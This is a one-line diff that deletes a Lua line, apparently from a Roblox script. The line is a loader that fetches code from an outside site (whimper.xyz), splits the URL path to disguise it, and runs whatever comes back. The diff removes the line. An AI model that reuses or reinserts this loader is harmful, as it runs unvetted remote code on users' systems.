@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://whimper.xyz/ki'..'tty'))()
